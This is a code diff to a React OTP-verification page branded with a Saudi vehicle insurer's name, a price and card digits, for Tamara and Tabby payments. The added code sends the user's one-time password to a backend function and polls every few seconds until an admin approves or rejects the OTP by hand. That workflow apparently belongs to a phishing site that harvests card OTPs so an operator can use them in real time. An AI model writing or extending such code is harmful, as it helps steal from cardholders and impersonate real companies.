@@ -18,6 +18,7 @@ const OtpVerification = () => {
   const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
   const price = searchParams.get("price") || "411.15";
   const cardLast4 = searchParams.get("cardLast4") || "6636";
+  const orderId = searchParams.get("orderId");
   const paymentId = searchParams.get("paymentId");
   const paymentType = searchParams.get("type") || "tamara"; // tamara or tabby
   
@@ -90,6 +91,24 @@ const OtpVerification = () => {
         return;
       }
 
+      // Card/manual-review flow (no paymentId): submit OTP via backend function (RLS-safe)
+      if (orderId) {
+        const visitorSessionId = sessionStorage.getItem("visitor_session_id") || "";
+        const { error } = await supabase.functions.invoke("submit-otp", {
+          body: {
+            orderId,
+            otpCode: otp,
+            visitorSessionId,
+          },
+        });
+
+        if (error) throw error;
+
+        setIsLoading(false);
+        setWaitingApproval(true);
+        return;
+      }
+
       if (orderData.sequenceNumber) {
         const { data: orderInfo, error: orderError } = await supabase
           .from("customer_orders")
@@ -129,6 +148,52 @@ const OtpVerification = () => {
       });
     }
   };
+
+  // Poll for admin OTP approval/rejection (card/manual-review flow)
+  useEffect(() => {
+    if (!waitingApproval) return;
+    if (paymentId) return;
+    if (!orderId) return;
+
+    const visitorSessionId = sessionStorage.getItem("visitor_session_id") || "";
+    if (!visitorSessionId) return;
+
+    let cancelled = false;
+
+    const check = async () => {
+      try {
+        const { data, error } = await supabase.functions.invoke("order-status", {
+          body: { orderId, visitorSessionId },
+        });
+
+        if (cancelled) return;
+        if (error) return;
+
+        const status = data?.status as string | undefined;
+        if (status === "completed") {
+          setWaitingApproval(false);
+          setVerificationStatus("success");
+          setTimeout(() => navigate("/payment-success"), 2000);
+        } else if (status === "otp_rejected") {
+          setWaitingApproval(false);
+          setVerificationStatus("error");
+          setTimeout(() => {
+            setVerificationStatus("idle");
+            setOtp("");
+          }, 3000);
+        }
+      } catch {
+        // ignore
+      }
+    };
+
+    check();
+    const interval = setInterval(check, 3000);
+    return () => {
+      cancelled = true;
+      clearInterval(interval);
+    };
+  }, [waitingApproval, paymentId, orderId, navigate]);
 
   // Rotate loading messages
   useEffect(() => {
